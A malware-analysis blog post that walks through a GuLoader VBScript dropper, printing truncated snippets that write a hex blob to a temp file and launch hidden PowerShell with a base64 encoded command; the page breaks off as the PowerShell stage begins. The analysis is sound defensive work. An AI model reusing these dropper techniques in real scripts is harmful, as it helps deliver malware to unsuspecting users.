<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="GuLoader Executing Shellcode Using Callback Functions" /><meta property="og:locale" content="en" /><meta name="description" content="I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/" /><meta property="og:description" content="I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/" /><link rel="canonical" href="https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/" /><meta property="og:url" content="https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-27T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GuLoader Executing Shellcode Using Callback Functions" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-01-27T00:00:00+00:00","description":"I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/","headline":"GuLoader Executing Shellcode Using Callback Functions","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/"},"url":"https://forensicitguy.github.io/guloader-executing-shellcode-callbacks/"}</script><title>GuLoader Executing Shellcode Using Callback Functions | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Tony Lambert</a></h1><p class="site-subtitle fst-italic mb-0">An educator that does security things</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener noreferrer" > <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>GuLoader Executing Shellcode Using Callback Functions</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>GuLoader Executing Shellcode Using Callback Functions</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1643241600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 27, 2022 </time> </span> <span> Updated <time data-ts="1648508960" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 28, 2022 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1934 words" > <em>10 min</em> read</span></div></div></div></header><div class="content"><p>I personally despise trying to analyze shellcode, but shellcode is becoming more common in malware of all types. From Metasploit and Cobalt Strike to GuLoader, loads of malicious tools include shellcode as injectable payloads to make detection harder. In today’s post I want to look at one of the most recent iterations of GuLoader and how it deploys its shellcode. If you want to play along at home, the sample I’m analyzing is in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/">https://bazaar.abuse.ch/sample/dcc73a1351b6b79d48f7b42a96edfb142ffe46f896e1ab9f412a615b1edd7c9b/</a></p><h2 id="triaging-the-first-stage"><span class="me-2">Triaging the First Stage</span><a href="#triaging-the-first-stage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>For the first stage, MalwareBazaar says its a VBScript file, so we’ve already got a decent hypothesis on the file type. We can go ahead and confirm with <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">xxd</code>. Sure enough, it looks like we’re dealing with a text file, and the first few bytes of the text file looks like they might be a VBScript comment prepended with a <code class="language-plaintext highlighter-rouge">'</code> character.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/guloader$</span><span class="w"> </span>file remittence.vbs 
<span class="go">remittence.vbs: ASCII text, with CRLF line terminators

</span><span class="gp">remnux@remnux:~/cases/guloader$</span><span class="w"> </span>xxd remittence.vbs | <span class="nb">head</span>
<span class="go">00000000: 2767 656e 6b61 6c64 656c 7320 556e 6d65  'genkaldels Unme
00000010: 7769 6e67 6239 204e 6575 726f 6e64 6536  wingb9 Neuronde6
00000020: 204b 726f 7033 2042 6172 6265 7269 206d   Krop3 Barberi m
00000030: 6973 7265 2066 7269 6d20 554e 4143 2048  isre frim UNAC H
00000040: 594c 4550 4920 4d41 4c54 4e49 4e20 4752  YLEPI MALTNIN GR
00000050: 4144 2048 4f4c 4f53 5920 4272 7569 6e73  AD HOLOSY Bruins
00000060: 6875 2064 656d 756c 2049 4e47 4956 4545  hu demul INGIVEE
00000070: 5520 504f 5354 4e41 5445 4e20 5649 4e44  U POSTNATEN VIND
00000080: 454e 5355 4e44 204b 7572 6461 6974 3320  ENSUND Kurdait3 
00000090: 5448 4f4d 534f 4e41 4e54 2053 7562 7275  THOMSONANT Subru
</span></pre></table></code></div></div><p>Looking at the details from <code class="language-plaintext highlighter-rouge">exiftool</code>, the size of the file stands out. Weighing in at 80 KiB, the script likely contains some binary/EXE content embedded inside. 673 lines of code, it’s a pretty decently-sized script. So let’s dive in!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/guloader$</span><span class="w"> </span>exiftool remittence.vbs 
<span class="go">ExifTool Version Number         : 12.30
File Name                       : remittence.vbs
Directory                       : .
File Size                       : 80 KiB
File Modification Date/Time     : 2022:01:25 01:07:38-05:00
File Access Date/Time           : 2022:01:24 21:43:55-05:00
File Inode Change Date/Time     : 2022:01:24 20:11:16-05:00
File Permissions                : -rw-r--r--
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : us-ascii
Newlines                        : Windows CRLF
Line Count                      : 673
Word Count                      : 3409
</span></pre></table></code></div></div><h2 id="examining-the-vbscript-code"><span class="me-2">Examining the VBScript Code</span><a href="#examining-the-vbscript-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Immediately on the first few lines of the script we can see several lines of VBScript comments. Usually comments are for code documentation (heh, right?) but in this case the adversary decided to put in some garbage code. This sort of thing is usually intended to stump static detection rules, lower AV detection rates, and slow down malware analysis. After a quick glance at the comment lines, there’s nothing that really tells me that we need to keep them, so we can just ignore or delete them.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1">'genkaldels Unmewingb9 Neuronde6 Krop3 Barberi misre frim UNAC HYLEPI MALTNIN GRAD HOLOSY Bruinshu demul INGIVEEU POSTNATEN VINDENSUND Kurdait3 THOMSONANT Subrules BRUGSGA Usselhed Fakt Waughtsfo Udmugning NONPRO NONDEFER MUDDERGRFT bondsla Bros europapa </span>
<span class="c1">'Bebrejd Blevins DRABS EDDA Uberrt2 TILLIGGEND Nedisni1 Unrefulg Tsum AGRA Renderne </span>
<span class="c1">'Darvon FORLDREKN Vasalsta faaspointe Numselea9 Speedw TVANGL Ejert stymieds Writ6 liquefy Censedspe4 MEANDR BOWLINGEN bassetters yokoonop visuals Platingbyg5 SKARNB Bygningsfe Pulli Farve baasetm klejne </span>
<span class="c1">'INDTRDELSE HJEMM Fortjenst Nsvi sirdar FORMAL Progra2 airworth Axometrybl6 Stan6 OBLIGATI Ineffi Unsa Conven Bisulfate AKUPUNKT preadjust SIDE Pels2 antilethar manch ALDERLIN Nimmedvor </span>
</pre></table></code></div></div><p>Next up in the code we have a simple sleep timer right after some variables get defined. The script sleeps for 2000 milliseconds before moving on to the next stage.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">Dim</span> <span class="nv">sired</span><span class="p">,</span> <span class="n">objExec</span><span class="p">,</span> <span class="n">strLine</span>
<span class="k">Dim</span> <span class="nv">MyFile</span><span class="p">,</span><span class="n">teststr</span>

<span class="n">F</span> <span class="o">=</span> <span class="n">timer</span>
<span class="n">Wscript</span><span class="p">.</span><span class="n">Sleep</span> <span class="mi">2000</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">timer</span> 
<span class="k">If</span> <span class="n">G</span> <span class="o">&gt;</span> <span class="n">F</span> <span class="n">then</span>
</pre></table></code></div></div><p>Down in the next section the adversary decides to set the <code class="language-plaintext highlighter-rouge">sired</code> and <code class="language-plaintext highlighter-rouge">CCA</code> variables multiple times in a row. No idea why they do it like this, maybe they also hit the save button in MS Office multiple times for safety. The <code class="language-plaintext highlighter-rouge">sired</code> variable contains a Wscript shell object and <code class="language-plaintext highlighter-rouge">CCA</code> contains a file system object for file writing.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">set</span> <span class="n">sired</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="k">Set</span> <span class="n">CCA</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"S"</span><span class="o">+</span><span class="s">"cripting.FileSystemObject"</span><span class="p">)</span>
<span class="n">set</span> <span class="n">sired</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="k">Set</span> <span class="n">CCA</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"S"</span><span class="o">+</span><span class="s">"cripting.FileSystemObject"</span><span class="p">)</span>
<span class="n">set</span> <span class="n">sired</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="k">Set</span> <span class="n">CCA</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"S"</span><span class="o">+</span><span class="s">"cripting.FileSystemObject"</span><span class="p">)</span>
</pre></table></code></div></div><p>And now we get into the good meat of the script. The <code class="language-plaintext highlighter-rouge">Fotografe6</code> variable is built over multiple lines and contains what loks like a hex string. I don’t see a traditional <code class="language-plaintext highlighter-rouge">MZ</code> header represented as <code class="language-plaintext highlighter-rouge">4D5A</code> in hex, but it could be further obfuscated somehow. We’ll just have to watch and see how the script uses it.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Fotografe6</span> <span class="o">=</span> <span class="n">Fotografe6</span> <span class="o">&amp;</span> <span class="s">"81ED000300006 ... EF9F10408E"</span>
<span class="n">Fotografe6</span> <span class="o">=</span> <span class="n">Fotografe6</span> <span class="o">&amp;</span> <span class="s">"4166620BE8491 ... 62D3219DF4"</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">clabbering</code> variable, just like the previous one, is built over multiple lines. In this case it appears to be base64 code because once we feed some of the chunks into CyberChef with the “From Base64” it decodes into valid text.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">clabbering</span> <span class="o">=</span> <span class="n">clabbering</span> <span class="o">&amp;</span> <span class="s">"IwBBAEkAUgBFA ... AGEAbgB0AG"</span>
<span class="n">clabbering</span> <span class="o">=</span> <span class="n">clabbering</span> <span class="o">&amp;</span> <span class="s">"kAdAB5AHIAbwAg ... bABrAG8AI"</span>
<span class="n">clabbering</span> <span class="o">=</span> <span class="n">clabbering</span> <span class="o">&amp;</span> <span class="s">"ABuAG8AbgBtAGE ... AbwBpAHMA"</span>
<span class="n">clabbering</span> <span class="o">=</span> <span class="n">clabbering</span> <span class="o">&amp;</span> <span class="s">"IABVAG4AdgBlAG ... MASABVAFQ"</span>
</pre></table></code></div></div><p>Now that we have an idea of the materials being manipulated in the script, let’s see how the script uses them. The next chunk of code looks like it’s building a PowerShell command. At this point I’m thinking the base64 chunk of text in <code class="language-plaintext highlighter-rouge">clabbering</code> above will likely be fed into PowerShell for execution. <code class="language-plaintext highlighter-rouge">Fotografe6</code> looks like it gets fed into a <code class="language-plaintext highlighter-rouge">baggrun()</code> and <code class="language-plaintext highlighter-rouge">lugsai()</code> function. Since <code class="language-plaintext highlighter-rouge">shellPath</code> contains a file path and the string <code class="language-plaintext highlighter-rouge">ISO-8859-1</code> refers to encoding, my hypothesis is that <code class="language-plaintext highlighter-rouge">lugsai()</code> writes the contents of <code class="language-plaintext highlighter-rouge">Fotografe6</code> to disk. Let’s go confirm that.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">TMP1</span> <span class="o">=</span> <span class="s">"%"</span><span class="o">+</span><span class="s">"TEMP%"</span>
<span class="n">MyFile</span> <span class="o">=</span>  <span class="n">sired</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s">"%windir%"</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"</span>
<span class="n">Fotografe6</span> <span class="o">=</span> <span class="n">baggrun</span><span class="p">(</span><span class="n">Fotografe6</span><span class="p">)</span>
<span class="n">shellPath</span> <span class="o">=</span> <span class="n">sired</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="n">TMP1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"\Champag6.dat"</span>
<span class="n">lugsai</span> <span class="n">shellPath</span><span class="p">,</span><span class="n">Fotografe6</span><span class="p">,</span><span class="s">"ISO-8859-1"</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">lugsai()</code> function looks like it works with an ADODB.Stream object, picks a character set, opens a file, and writes text to disk. So far it looks like our hypothesis was correct.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">Function</span> <span class="nf">lugsai</span><span class="p">(</span><span class="n">NONN</span><span class="p">,</span> <span class="n">UNDEGRAD</span><span class="p">,</span> <span class="n">Lathesme1</span><span class="p">)</span>
  <span class="k">Dim</span> <span class="nv">BinaryStream</span>
  <span class="n">ADO</span> <span class="o">=</span> <span class="s">"ADODB.Stream"</span>
  <span class="k">Set</span> <span class="n">BinaryStream</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="n">ADO</span><span class="p">)</span>
  <span class="n">BinaryStream</span><span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">2</span>
  <span class="n">BinaryStream</span><span class="p">.</span><span class="n">CharSet</span> <span class="o">=</span> <span class="n">Lathesme1</span>
  <span class="n">BinaryStream</span><span class="p">.</span><span class="n">Open</span>
  <span class="n">BinaryStream</span><span class="p">.</span><span class="n">WriteText</span> <span class="n">UNDEGRAD</span>
  <span class="n">BinaryStream</span><span class="p">.</span><span class="n">SaveToFile</span> <span class="n">NONN</span><span class="p">,</span> <span class="mi">2</span>
<span class="k">End</span> <span class="k">Function</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">baggrun()</code> function looks like it works with the hex string in <code class="language-plaintext highlighter-rouge">Fotografe6</code>. The function walks through the hex string and checks for “ZZZ” values. If it doesn’t find them it just outputs the hex string.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">Function</span> <span class="nf">baggrun</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
	<span class="k">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">To</span> <span class="n">len</span><span class="p">(</span><span class="n">h</span><span class="p">)</span> <span class="n">step</span> <span class="mi">2</span>
	<span class="n">if</span> <span class="n">ChrW</span><span class="p">(</span><span class="s">"&amp;H"</span> <span class="o">&amp;</span> <span class="n">mid</span><span class="p">(</span><span class="n">h</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span> <span class="o">=</span> <span class="s">"ZZZ"</span> <span class="n">then</span> <span class="n">Wscript</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">baggrun</span> <span class="o">=</span> <span class="n">baggrun</span> <span class="o">+</span> <span class="n">ChrW</span><span class="p">(</span><span class="s">"&amp;H"</span> <span class="o">&amp;</span> <span class="n">mid</span><span class="p">(</span><span class="n">h</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
	<span class="k">Next</span>
<span class="k">End</span> <span class="k">Function</span>
</pre></table></code></div></div><p>And now the script starts making some movement outside of itself. The <code class="language-plaintext highlighter-rouge">-EncodedCommand</code> string here indicates we’re likely going to see a PowerShell command with a base64 chunk of code. Sure enough, the base64 code in <code class="language-plaintext highlighter-rouge">clabbering</code> eventually gets used for the PowerShell command. So let’s</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">Set</span> <span class="n">obj1</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Shell.Application"</span><span class="p">)</span>
<span class="n">max1</span><span class="o">=</span><span class="n">clabbering</span>
<span class="n">RAVNEAGT</span> <span class="o">=</span> <span class="s">" -EncodedCommand "</span> <span class="o">&amp;</span> <span class="n">chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">max1</span> <span class="o">&amp;</span> <span class="n">chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span>

<span class="k">If</span> <span class="n">CCA</span><span class="p">.</span><span class="n">FileExists</span><span class="p">(</span><span class="n">MyFile</span><span class="p">)</span> <span class="o">=</span> <span class="k">True</span> <span class="n">then</span> 
 <span class="n">obj1</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="n">MyFile</span> <span class="p">,</span> <span class="n">RAVNEAGT</span> <span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="mi">0</span>
<span class="n">else</span> 
 <span class="n">obj1</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="s">"powershell.exe"</span><span class="p">,</span> <span class="n">RAVNEAGT</span> <span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="s">""</span><span class="p">,</span><span class="mi">0</span>
<span class="n">end</span> <span class="n">if</span> 
</pre></table></code></div></div><h2 id="powershell-executing-shellcode-with-net"><span class="me-2">PowerShell Executing Shellcode with .NET</span><a href="#powershell-executing-shellcode-with-net" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After decoding the base64 in <code class="language-plaintext highlighter-rouge">clabbering</code> with CyberChef we can see some PowerShell code that gets executed. Just like the VBScript, the first line or two just contains a useless comment. Looking through the rest of the code there are also a few comments mingled among the useful stuff. For a bit more brevity I’ve gone ahead and removed comments from the code I show here. To slow down analysis some more, the adversary also threw in a bunch of <code class="language-plaintext highlighter-rouge">Test-Path</code> commands. None of them seemed to serve any function, so I removed them from the code here.</p><p>The first big chunk of PowerShell is an <code class="language-plaintext highlighter-rouge">Add-Type</code> cmdlet followed by some C# code. <code class="language-plaintext highlighter-rouge">Add-Type</code> allows you to import a .NET class DLL into memory to work with in PowerShell. When combined with the <code class="language-plaintext highlighter-rouge">-TypeDefinition</code>, you can provide some raw C# code that gets compiled into bytecode at runtime and loaded into PowerShell. In this case, the adversary defines a .NET class named <code class="language-plaintext highlighter-rouge">Ofayve1</code> that contains <a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d">Platform Invoke (P/Invoke) code</a> that allows the adversary to call native Win32 functions from .NET code.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" 